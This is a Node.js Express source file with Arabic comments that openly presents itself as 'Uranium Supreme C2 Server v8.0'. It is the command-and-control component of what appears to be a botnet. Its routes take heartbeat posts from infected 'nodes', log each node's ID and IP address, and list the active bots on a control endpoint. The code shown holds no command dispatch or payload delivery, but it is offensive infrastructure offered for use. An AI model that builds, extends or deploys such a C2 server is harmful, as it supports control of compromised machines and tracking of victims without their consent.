const express = require('express');
const app = express();
const PORT = process.env.PORT || 10000;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

let activeNodes = {};

// استقبال نبضات العقد الحية
app.post('/node/pulse', (req, res) => {
    const { node_id, status } = req.body;
    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    activeNodes[node_id] = {
        ip: clientIp,
        lastSeen: Date.now(),
        status: status || 'online'
    };
    
    console.log(`[⚡] عقدة يورانيوم متصلة بنجاح: ${node_id} من IP: ${clientIp}`);
    res.status(200).send("ACK_OK");
});

// لوحة التحكم لعرض العقد النشطة
app.get('/nodes', (req, res) => {
    res.json({
        empire: "مملكة ناصر دين الله الكلعي - Uranium Supreme v8.0",
        activeCount: Object.keys(activeNodes).length,
        nodes: activeNodes
    });
});

app.get('/', (req, res) => {
    res.send("<h1>[⚡] Uranium Supreme C2 Server v8.0 Online</h1>");
});

app.listen(PORT, () => {
    console.log(`[+] Uranium C2 Server running on port ${PORT}`);
});
